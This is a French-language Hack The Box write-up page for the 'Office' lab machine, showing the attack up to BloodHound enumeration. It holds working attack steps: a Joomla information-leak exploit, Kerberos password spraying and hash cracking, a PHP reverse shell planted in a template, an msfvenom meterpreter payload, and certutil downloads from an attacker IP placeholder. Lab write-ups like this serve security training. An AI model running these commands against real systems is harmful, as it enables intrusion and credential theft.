@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au CVE-2023-23752. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&amp;rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&amp;rsquo;accéder à un dossier partagé contenant un fichier pcap." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/06/htb-office/" />
+
+
+    <title>
+        
+            HTB: Office
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Office">
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au CVE-2023-23752. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&rsquo;accéder à un dossier partagé contenant un fichier pcap."><meta itemprop="datePublished" content="2024-06-19T23:28:44-05:00" />
+<meta itemprop="dateModified" content="2024-06-19T23:28:44-05:00" />
+<meta itemprop="wordCount" content="2472"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Office/Office.png" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Office/Office.png" /><meta name="twitter:title" content="HTB: Office"/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au CVE-2023-23752. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&rsquo;accéder à un dossier partagé contenant un fichier pcap."/>
+
+
+
+    <meta property="og:title" content="HTB: Office" />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Office Niveau: Difficile OS: Windows Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au CVE-2023-23752. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&rsquo;accéder à un dossier partagé contenant un fichier pcap." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/06/htb-office/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Office/Office.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-19T23:28:44-05:00" />
+<meta property="article:modified_time" content="2024-06-19T23:28:44-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-06-19 23:28:44 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="en" href="https://scorpiosec.com/posts/2024/06/htb-office/">en</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        12 minutes
+
+         | Aussi disponible en
+          
+              <a href="https://scorpiosec.com/posts/2024/06/htb-office/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/fr/posts/2024/06/htb-office/">HTB: Office</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table des matières</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#balayage">Balayage</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#accès-initial">Accès Initial</a>
+      <ul>
+        <li><a href="#premier-mouvement-latéral">Premier Mouvement Latéral</a></li>
+        <li><a href="#enumération-de-lactive-directory">Enumération de l&rsquo;Active Directory</a></li>
+        <li><a href="#deuxième-mouvement-latéral">Deuxième Mouvement Latéral</a></li>
+        <li><a href="#troisième-mouvement-latéral">Troisième Mouvement Latéral</a></li>
+        <li><a href="#note">Note</a></li>
+      </ul>
+    </li>
+    <li><a href="#elévation-de-privilèges">Elévation de Privilèges</a></li>
+    <li><a href="#mots-de-fin">Mots de Fin</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Office" target="_blank" >Office</a>
+
+</li>
+<li>Niveau: Difficile</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au <code>CVE-2023-23752</code>. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d&rsquo;utilisateur valide pour le mot de passe, ce qui nous permet d&rsquo;accéder à un dossier partagé contenant un fichier pcap.</p>
+<p>Nous examinons le fichier pcap avec Wireshark, et découvrons une trame <code>AS-REQ</code> contenant toutes les informations nécessaires pour reconstruire un hash. En utilisant hashcat, nous récupérons un mot de passe qui nous permet d&rsquo;accéder au tableau de bord de Joomla. En insérant un reverse shell PHP dans un template Joomla, nous obtenons notre accès initial. À partir de ce premier shell, nous nous déplaçons latéralement vers un autre utilisateur et récupérons le fichier <code>user.txt</code>.</p>
+<p>Avec l&rsquo;aide de Bloodhound, nous apprenons que l&rsquo;un des utilisateurs a la permission <code>CanPSRemote</code> et est également membre du groupe <code>GPO Managers</code>. Nous réalisons un autre mouvement latéral en exploitant une version obsolète de LibreOffice via le <code>CVE-2023-2255</code>, en téléchargeant un fichier <code>.odt</code> malveillant sur un site web interne. Notre dernier mouvement latéral est accompli en décryptant certains fichiers d&rsquo;identification DPAPI avec Mimikatz, ce qui permet d&rsquo;obtenir le mot de passe de l&rsquo;utilisateur ayant les permissions laxistes. Enfin, nous exploitons la mauvaise configuration du serveur en ajoutant l&rsquo;utilisateur au groupe Administrators, ce qui nous permet de lire le fichier <code>root.txt</code>.</p>
+<p>Addresse IP cible - <code>10.10.11.3</code></p>
+<h2 id="balayage">Balayage</h2>
+<p>Un script bash est utilisé pour le balayage, vous pouvez le trouver <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >ici</a>
+
+.</p>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.3 Office
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-20 00:30 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> office.htb <span style="color:#f92672">(</span>10.10.11.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.066s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Apache httpd 2.4.56 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">16</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /joomla/administrator/ /administrator/ /api/ /bin/ 
+</span></span><span style="display:flex;"><span>| /cache/ /cli/ /components/ /includes/ /installation/ 
+</span></span><span style="display:flex;"><span>|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
+</span></span><span style="display:flex;"><span>|_http-title: Home
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-06-20 13:30:27Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
+</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http      Apache httpd 2.4.56 <span style="color:#f92672">(</span>OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost
+</span></span><span style="display:flex;"><span>| Not valid before: 2009-11-10T23:48:47
+</span></span><span style="display:flex;"><span>|_Not valid after:  2019-11-08T23:48:47
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: office.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.office.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-05-10T12:36:58
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-05-09T12:36:58
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>51567/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>51587/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>51639/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-06-20T13:31:17
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.29 seconds
+</span></span></code></pre></div><p>Le scan nmap révèle un contrôleur de domaine nommé <code>office.htb</code> que nous ajoutons au fichier <code>/etc/hosts</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.3 office.htb dc.office.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>En visitant <code>http://office.htb/</code> nous trouvons un blog sur les armures d&rsquo;Iron Man.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/office-blog.png" alt="Office blog website"></p>
+<p>Grâce à wappalyzer, nous découvrons que le site utilise Joomla.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/wappalyzer.png" alt="Office - Wappalyzer results"></p>
+<p>Nous avons un fichier <code>robots.txt</code> dans les résultats de nmap.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/robots-txt.png" alt="Office - robots.txt"></p>
+<p>Plusieurs répertoires sont découverts.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/endpoints-found.png" alt="robots.txt directories"></p>
+<p><code>http://office.htb/administrator/</code> nous conduit à la page de connexion de l&rsquo;administrateur; cependant, nous n&rsquo;avons pas d&rsquo;identifiants.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Joomla-admin-login.png" alt="Joomla admin panel"></p>
+<p>Sur <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version" target="_blank" >cette</a>
+
+ page HackTricks, nous apprenons quelques techniques pour obtenir la version de Joomla et nous l&rsquo;obtenons en allant à <code>http://office.htb//administrator/manifests/files/joomla.xml</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Joomla-version.png" alt="Joomla version"></p>
+<p>Pour cette version, nous trouvons le <a href="https://vulncheck.com/blog/joomla-for-rce" target="_blank" >CVE-2023-23752</a>
+
+ qui est une vulnérabilité de fuite d&rsquo;information. Un PoC est disponible <a href="https://github.com/0xNahim/CVE-2023-23752" target="_blank" >ici</a>
+
+.</p>
+<p>Après avoir exécuté <code>python3 exploit.py -u http://office.htb</code>, nous obtenons le mot de passe root pour MySQL <code>H0lOgrams4reTakIng0Ver754!</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/joomla-creds.png" alt="DB password recovered"></p>
+<p>Notre tentative de connexion avec <code>administrator:H0lOgrams4reTakIng0Ver754!</code> échoue, nous devons donc trouver un autre moyen d&rsquo;utiliser ce mot de passe. Nous savons grâce aux résultats du scan nmap que Kerberos fonctionne sur le port 88, utilisons <a href="https://github.com/ropnop/kerbrute" target="_blank" >kerbrute</a>
+
+ pour énumérer les comptes valides.</p>
+<pre tabindex="0"><code>kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/valid-users.png" alt="Valid usernames found with Kerbrute"></p>
+<p>Avec la liste des utilisateurs valides, nous essayons maintenant de trouver une combinaison valide.</p>
+<pre tabindex="0"><code>kerbrute passwordspray --dc office.htb -d office.htb usernames &#39;H0lOgrams4reTakIng0Ver754!&#39;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/login-sucess.png" alt="Valid credential pair"></p>
+<p>Nous constatons que <code>dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!</code> marche!</p>
+<p>Avec impacket, nous nous connectons à smb et nous remarquons un partage appelé <code>SOC Analysis</code>, contenant un fichier pcap nommé <code>Latest-System-Dump-8fbc124d.pcap</code> que nous téléchargeons.</p>
+<pre tabindex="0"><code>impacket-smbclient dwolfe:&#39;H0lOgrams4reTakIng0Ver754!&#39;@10.10.11.3
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/share-access.png" alt="SMB login and SOC Analysis share"></p>
+<p>Nous ouvrons le fichier pcap avec Wireshark et en filtrant pour <code>kerberos</code> nous découvrons des informations intéressantes.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/pcap.png" alt="Kerberos pcap file"></p>
+<blockquote>
+<p>Lorsqu&rsquo;un utilisateur demande un ticket d&rsquo;octroi de ticket (TGT) au centre de distribution de clés (KDC), un processus appelé AS-REQ (Authentication Service Request) est utilisé. Dans le cadre de ce processus, l&rsquo;utilisateur doit prouver son identité au centre de distribution de clés. Pendant l&rsquo;AS-REQ, le client (l&rsquo;utilisateur) envoie un horodatage crypté avec son hachage NTLM (qui est dérivé de son mot de passe). Cela prouve qu&rsquo;il connaît le mot de passe sans l&rsquo;envoyer directement.</p>
+</blockquote>
+<p>Nous pouvons extraire le hachage du mot de passe du fichier pcap et utiliser hashcat pour le craquer. Étant donné que hashcat possède plusieurs modules pour les hachages Kerberos, nous devons utiliser le bon format. Passons en revue les informations dont nous disposons:</p>
+<ul>
+<li>La présence des champs <code>PA-DATA</code>, qui sont utilisés pour la pré-authentification, confirme que nous avons affaire à des paquets de pré-authentification Kerberos.</li>
+<li>Le type de chiffrement (etype) est spécifié comme étant <code>18</code> et il utilise AES-256.</li>
+<li>Nous avons le chiffre (hachage NTLM) utilisé pour crypter l&rsquo;horodatage.</li>
+<li>Nous avons le nom d&rsquo;utilisateur (<code>CNameString = tstark</code>) et le nom de domaine (<code>realm = OFFICE.HTB</code>).</li>
+</ul>
+<p>Avec ces informations, nous trouvons que le hachage correspondant doit suivre le format <code>$krb5pa$18$user$realm$cipher</code>. Il correspond au module 19900 de hashcat que vous pouvez vérifier <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" >ici</a>
+
+.</p>
+<p>Nous utiliserons un script Bash pour obtenir le hachage.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>filter<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>tshark -r $1 -Y <span style="color:#e6db74">&#34;kerberos.msg_type == 10 &amp;&amp; kerberos.cipher &amp;&amp; kerberos.realm &amp;&amp; kerberos.CNameString&#34;</span> -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E separator<span style="color:#f92672">=</span>$ <span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>echo $filter | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#66d9ef">)</span> ; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;\$krb5pa\$18\$</span>$i<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p><img src="https://scorpiosec.com/images/HTB-Office/kerberos-hash.png" alt="Kerberos hash found"></p>
+<p>En utilisant hashcat, nous obtenons le mot de passe <code>playboy69</code>.</p>
+<pre tabindex="0"><code>hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/hash-cracked.png" alt="Kerberos hash cracked with hashcat"></p>
+<h2 id="accès-initial">Accès Initial</h2>
+<p>Avec les identifiants <code>administrator:playboy69</code> nous nous connectons au tableau de bord de Joomla, nous sommes connectés en tant que <code>Tony Stark</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/joomla-dashboard.png" alt="Joomla Dashboard"></p>
+<p>Comme c&rsquo;est souvent le cas avec les logiciels CMS, il est possible de modifier les templates à l&rsquo;aide d&rsquo;un code personnalisé. Nous exploitons cette fonction pour obtenir un shell inversé. En allant dans <code>System</code> &ndash;&gt; <code>Site Templates</code> &ndash;&gt; cliquez sur <code>Cassiopeia Details and Files</code> &ndash;&gt; remplacez <code>error.php</code> par un reverse shell PHP que vous pouvez trouver sur <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+
+ &ndash;&gt; Save and Close &ndash;&gt; enfin visitez <code>http://office.htb/templates/cassiopeia/error.php</code> pour activer le reverse shell.</p>
+<p>Sur le listener, nous obtenons un shell sous le nom de <code>web_account</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/shell-office.png" alt="Initial foothold, shell as web_account"></p>
+<h3 id="premier-mouvement-latéral">Premier Mouvement Latéral</h3>
+<p>Nous ne pouvons pas lire le fichier <code>user.txt</code> avec ce compte mais nous pouvons passer à l&rsquo;utilisateur <code>tstark</code>. Puisque nous avons déjà les identifiants corrects, nous pouvons utiliser <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >runascs</a>
+
+ pour accéder au compte, nous utiliserons un shell meterpreter.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP_ADDRESS&gt; LPORT=&lt;PORT_NUMBER&gt; -f exe -o payload.exe
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/msfvenom-cmd.png" alt="malicious file generated with msfvenom"></p>
+<p>Après avoir envoyé les deux fichiers à la cible, nous configurons le handler dans Metasploit.</p>
+<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe
+
+certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
+</code></pre><pre tabindex="0"><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost &lt;IP_ADDRESS&gt;
+set lport &lt;PORT_NUMBERS&gt;
+run
+</code></pre><p>En exécutant RunasCs avec notre fichier malveillant, nous obtenons un shell meterpreter.</p>
+<pre tabindex="0"><code>runascs.exe tstark playboy69 payload.exe
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Office/runascs-cmd.png" alt="runascs command"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/tstark-meterpreter.png" alt="tstark meterpreter shell"></p>
+<p>Le fichier <code>user.txt</code> se trouve dans <code>C:\Users\tstark\Desktop</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/user-flag-metasploit.png" alt="user flag location"></p>
+<p>De plus, nous remarquons la présence de deux utilisateurs supplémentaires sur le système (PPotts and HHogan).</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/Users-list.png" alt="users directory on target system"></p>
+<h3 id="enumération-de-lactive-directory">Enumération de l&rsquo;Active Directory</h3>
+<p>Sachant que nous avons affaire à un contrôleur de domaine, utilisons Bloodhound pour l&rsquo;énumérer.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Office/bloodhound-cmd.png" alt="Bloodhound command"></p>
+<pre tabindex="0"><code>bloodhound-python -c all -u tstark -p &#39;playboy69&#39; -d office.htb -dc dc.office.htb -ns 10.10.11.3
+</code></pre><p>Une fois la collecte de données terminée, nous pouvons lancer Bloodhound.</p>
